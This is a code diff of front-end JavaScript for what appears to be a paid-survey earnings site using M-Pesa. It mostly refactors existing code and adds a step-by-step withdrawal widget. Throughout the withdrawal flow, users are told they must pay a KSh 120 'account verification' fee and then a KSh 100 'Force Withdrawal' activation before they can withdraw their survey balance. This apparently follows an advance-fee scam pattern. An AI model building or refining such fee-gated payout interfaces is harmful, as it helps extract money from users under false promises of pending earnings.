@@ -94,7 +94,6 @@ function showPanel(name) {
   if (name === 'survey') loadQuestions(currentPage);
 
   if (name === 'withdraw') {
-    // Hide all gates and clear alerts while stats reload
     document.getElementById('wd-locked').classList.add('hidden');
     document.getElementById('wd-force').classList.add('hidden');
     clearAlert(document.getElementById('wd-error'));
@@ -102,7 +101,9 @@ function showPanel(name) {
     loadStats();
   }
 
-  if (name === 'transactions') renderAllTransactions();
+  if (name === 'transactions') {
+    renderAllTransactions();
+  }
 }
 
 // ════════════════════════════════════════════
@@ -255,7 +256,10 @@ async function doCompleteProfile() {
   const btn        = document.getElementById('btn-profile');
 
   clearAlert(errEl); clearAlert(succEl);
-  if (!name || !county || !occupation || !education) { showAlert(errEl, 'All fields are required.'); return; }
+  if (!name || !county || !occupation || !education) {
+    showAlert(errEl, 'All fields are required.');
+    return;
+  }
 
   btn.disabled = true;
   btn.innerHTML = '<span class="spinner"></span>';
@@ -294,9 +298,10 @@ async function loadStats() {
     const data = await apiFetch('/survey/stats');
     stats = {
       ...data,
-      completedIds: data.completedIds || [],
-      forceVerified: data.forceVerified || false,
-      activationPhone: data.activationPhone || ""
+      completedIds:    data.completedIds    || [],
+      forceVerified:   data.forceVerified   || false,
+      activationPhone: data.activationPhone || "",
+      transactions:    data.transactions    || []
     };
     updateDashboard();
     updateWithdrawPanel();
@@ -326,25 +331,61 @@ function updateDashboard() {
 
   const hour  = new Date().getHours();
   const greet = hour < 12 ? 'Good morning' : hour < 17 ? 'Good afternoon' : 'Good evening';
-  document.getElementById('dash-greeting').textContent = `${greet}, ${userProfile?.name || 'there'}!`;
+  document.getElementById('dash-greeting').textContent =
+    `${greet}, ${userProfile?.name || 'there'}!`;
 
-  const banner      = document.getElementById('activation-banner');
-  const bannerTitle = document.getElementById('activation-banner-title');
-  const bannerDesc  = document.getElementById('activation-banner-desc');
-  const bannerBtn   = document.getElementById('activation-banner-btn');
+  // ── Withdraw CTA widget ──
+  const wctaTitle = document.getElementById('wcta-title');
+  const wctaDesc  = document.getElementById('wcta-desc');
+  const wctaBtn   = document.getElementById('wcta-btn');
+  const dot1      = document.getElementById('wcta-dot-1');
+  const dot2      = document.getElementById('wcta-dot-2');
+  const dot3      = document.getElementById('wcta-dot-3');
+  const step1     = document.getElementById('wcta-step-1');
+  const step2     = document.getElementById('wcta-step-2');
+  const step3     = document.getElementById('wcta-step-3');
 
-  if (stats.forceVerified) {
-    banner.classList.add('hidden');
-  } else if (stats.activated) {
-    banner.classList.remove('hidden');
-    if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-link" style="margin-right:6px"></i>One Step Away from Receiving Payment';
-    if (bannerDesc)  bannerDesc.textContent = 'Your identity has been verified. Complete the Force Withdrawal activation to enable M-Pesa payouts.';
-    if (bannerBtn)   { bannerBtn.textContent = 'Force Withdrawal Now'; bannerBtn.onclick = () => showPanel('withdraw'); }
-  } else {
-    banner.classList.remove('hidden');
-    if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:6px"></i>Account Verification Required';
-    if (bannerDesc)  bannerDesc.textContent = 'To activate M-Pesa payment services, a one-time account verification is required before your first payment request.';
-    if (bannerBtn)   { bannerBtn.textContent = 'Verify Account'; bannerBtn.onclick = () => showPanel('withdraw'); }
+  if (dot1 && dot2 && dot3) {
+    if (!stats.activated) {
+      dot1.className  = 'wcta-step-dot active';
+      dot2.className  = 'wcta-step-dot pending';
+      dot3.className  = 'wcta-step-dot pending';
+      step1.className = 'wcta-step active';
+      step2.className = 'wcta-step';
+      step3.className = 'wcta-step';
+      if (wctaTitle) wctaTitle.textContent = 'Withdraw Your Earnings';
+      if (wctaDesc)  wctaDesc.textContent  = 'Complete a one-time KSh 120 account verification to activate M-Pesa withdrawals.';
+      if (wctaBtn) {
+        wctaBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account – KSh 120';
+        wctaBtn.onclick   = () => showPanel('withdraw');
+      }
+    } else if (!stats.forceVerified) {
+      dot1.className  = 'wcta-step-dot done';
+      dot2.className  = 'wcta-step-dot active';
+      dot3.className  = 'wcta-step-dot pending';
+      step1.className = 'wcta-step done';
+      step2.className = 'wcta-step active';
+      step3.className = 'wcta-step';
+      if (wctaTitle) wctaTitle.textContent = 'One Step Away from Withdrawal';
+      if (wctaDesc)  wctaDesc.textContent  = 'Account verified. Complete the KSh 100 Force Withdrawal activation to enable payouts.';
+      if (wctaBtn) {
+        wctaBtn.innerHTML = '<i class="fas fa-link"></i> Force Withdrawal – KSh 100';
+        wctaBtn.onclick   = () => showPanel('withdraw');
+      }
+    } else {
+      dot1.className  = 'wcta-step-dot done';
+      dot2.className  = 'wcta-step-dot done';
+      dot3.className  = 'wcta-step-dot active';
+      step1.className = 'wcta-step done';
+      step2.className = 'wcta-step done';
+      step3.className = 'wcta-step active';
+      if (wctaTitle) wctaTitle.textContent = 'Ready to Withdraw';
+      if (wctaDesc)  wctaDesc.textContent  = 'Your account is fully verified. Submit a payment request directly to your M-Pesa number.';
+      if (wctaBtn) {
+        wctaBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Withdraw Now';
+        wctaBtn.onclick   = () => showPanel('withdraw');
+      }
+    }
   }
 
   renderDashTransactions();
@@ -383,8 +424,12 @@ function renderTxItem(tx) {
   if (type === 'withdrawal')                                  { iconClass = 'withdraw'; iconName = 'paper-plane'; }
   else if (type === 'welcome_bonus' || type === 'activation') { iconClass = 'bonus';    iconName = 'gift'; }
 
-  const date   = new Date(tx.createdAt).toLocaleDateString('en-KE', { day: 'numeric', month: 'short', year: 'numeric' });
-  const amount = isPositive ? `+KSh ${tx.amount.toFixed(2)}` : `-KSh ${Math.abs(tx.amount).toFixed(2)}`;
+  const date   = new Date(tx.createdAt).toLocaleDateString('en-KE', {
+    day: 'numeric', month: 'short', year: 'numeric'
+  });
+  const amount = isPositive
+    ? `+KSh ${tx.amount.toFixed(2)}`
+    : `-KSh ${Math.abs(tx.amount).toFixed(2)}`;
 
   return `<div class="tx-item">
     <div class="tx-icon ${iconClass}"><i class="fas fa-${iconName}"></i></div>
@@ -553,30 +598,32 @@ function updateWithdrawPanel() {
   const bal = (stats.balance || 0).toFixed(2);
   document.getElementById('wd-balance').textContent = `KSh ${bal}`;
 
-  // Update slider max based on balance
   const maxWithdraw = Math.max(150, Math.min(Math.floor((stats.balance || 0) / 10) * 10, 10000));
   const slider = document.getElementById('wd-slider');
-  slider.max = maxWithdraw;
-  document.getElementById('wd-slider-max').textContent = `KSh ${maxWithdraw.toLocaleString()}`;
-  updateSlider();
+  if (slider) {
+    slider.max = maxWithdraw;
+    const sliderMax = document.getElementById('wd-slider-max');
+    if (sliderMax) sliderMax.textContent = `KSh ${maxWithdraw.toLocaleString()}`;
+    updateSlider();
+  }
 
-  const statusEl  = document.getElementById('wd-status');
-  const phoneRow  = document.getElementById('wd-phone-row');
-  const regPhone  = document.getElementById('wd-reg-phone');
+  const statusEl = document.getElementById('wd-status');
+  const phoneRow = document.getElementById('wd-phone-row');
+  const regPhone = document.getElementById('wd-reg-phone');
 
-  phoneRow.classList.add('hidden');
+  if (phoneRow) phoneRow.classList.add('hidden');
 
   if (!stats.activated) {
-    statusEl.innerHTML = '<span class="chip gold"><i class="fas fa-shield-alt"></i> Verification Required</span>';
+    if (statusEl) statusEl.innerHTML = '<span class="chip gold"><i class="fas fa-shield-alt"></i> Verification Required</span>';
   } else if (!stats.forceVerified) {
-    statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Verified – Payout Activation Pending</span>';
-    if (stats.activationPhone) {
+    if (statusEl) statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Verified – Payout Activation Pending</span>';
+    if (stats.activationPhone && phoneRow && regPhone) {
       phoneRow.classList.remove('hidden');
       regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
     }
   } else {
-    statusEl.innerHTML = '<span class="chip"><i class="fas fa-check"></i> Fully Verified</span>';
-    if (stats.activationPhone) {
+    if (statusEl) statusEl.innerHTML = '<span class="chip"><i class="fas fa-check"></i> Fully Verified</span>';
+    if (stats.activationPhone && phoneRow && regPhone) {
       phoneRow.classList.remove('hidden');
       regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
     }
@@ -584,11 +631,15 @@ function updateWithdrawPanel() {
 }
 
 function updateSlider() {
-  const val     = parseFloat(document.getElementById('wd-slider').value);
+  const slider = document.getElementById('wd-slider');
+  if (!slider) return;
+  const val     = parseFloat(slider.value);
   const fee     = parseFloat((val * 0.04).toFixed(2));
   const receive = parseFloat((val - fee).toFixed(2));
-  document.getElementById('wd-amount-display').textContent = val;
-  document.getElementById('wd-receive').textContent = `KSh ${receive.toFixed(2)}`;
+  const display = document.getElementById('wd-amount-display');
+  const receiveEl = document.getElementById('wd-receive');
+  if (display)   display.textContent   = val;
+  if (receiveEl) receiveEl.textContent = `KSh ${receive.toFixed(2)}`;
 }
 
 // ── Payment request submit ──
@@ -602,7 +653,6 @@ async function doWithdraw() {
   clearAlert(errEl);
   clearAlert(succEl);
 
-  // Always hide gates on fresh attempt
   document.getElementById('wd-locked').classList.add('hidden');
   document.getElementById('wd-force').classList.add('hidden');
 
@@ -618,26 +668,26 @@ async function doWithdraw() {
   }
 
   if (amount > (stats.balance || 0)) {
-    showAlert(errEl, `Insufficient compensation balance. Your available balance is KSh ${(stats.balance || 0).toFixed(2)}.`);
+    showAlert(errEl, `Insufficient balance. Your available compensation is KSh ${(stats.balance || 0).toFixed(2)}.`);
     return;
   }
 
   // ── Step 2: Verification gates ──
   if (!stats.activated) {
-    showAlert(errEl, 'Account verification required. Complete the one-time KSh 150 verification below to proceed.');
+    showAlert(errEl, 'Account verification required. Complete the one-time KSh 120 verification below to proceed.');
     document.getElementById('wd-locked').classList.remove('hidden');
     document.getElementById('wd-locked').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
     return;
   }
 
   if (!stats.forceVerified) {
-    showAlert(errEl, 'Payout channel activation required. Complete the one-time KSh 100 Force Withdrawal below to proceed.');
+    showAlert(errEl, 'Payout channel activation required. Complete the KSh 100 Force Withdrawal below to proceed.');
     document.getElementById('wd-force').classList.remove('hidden');
     document.getElementById('wd-force').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
     return;
   }
 
-  // ── Step 3: Process payment request ──
+  // ── Step 3: Process ──
   const fee     = parseFloat((amount * 0.04).toFixed(2));
   const receive = parseFloat((amount - fee).toFixed(2));
 
@@ -661,7 +711,7 @@ async function doWithdraw() {
   }
 }
 
-// ── Account Verification (KSh 150) ──
+// ── Account Verification (KSh 120) ──
 async function doActivate() {
   const phone  = document.getElementById('act-phone').value.trim();
   const errEl  = document.getElementById('act-error');
@@ -683,7 +733,7 @@ async function doActivate() {
   } catch (err) {
     showAlert(errEl, err.message || 'Failed to send verification prompt.');
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 150';
+    btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
   }
 }
 
@@ -697,7 +747,7 @@ function startActivationPoll(ref) {
     if (attempts > 30) {
       clearInterval(activationPollTimer);
       btn.disabled = false;
-      btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 150';
+      btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
       return;
     }
     try {
@@ -705,7 +755,6 @@ function startActivationPoll(ref) {
       if (data.status === 'success') {
         clearInterval(activationPollTimer);
         await loadStats();
-        // Auto-transition: hide activation gate, show force gate
         document.getElementById('wd-locked').classList.add('hidden');
         document.getElementById('wd-force').classList.remove('hidden');
         document.getElementById('wd-force').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
@@ -715,7 +764,7 @@ function startActivationPoll(ref) {
         clearInterval(activationPollTimer);
         showAlert(document.getElementById('act-error'), 'Verification payment failed. Please try again.');
         btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 150';
+        btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
       }
     } catch (err) {
       console.error('Poll error:', err.message);
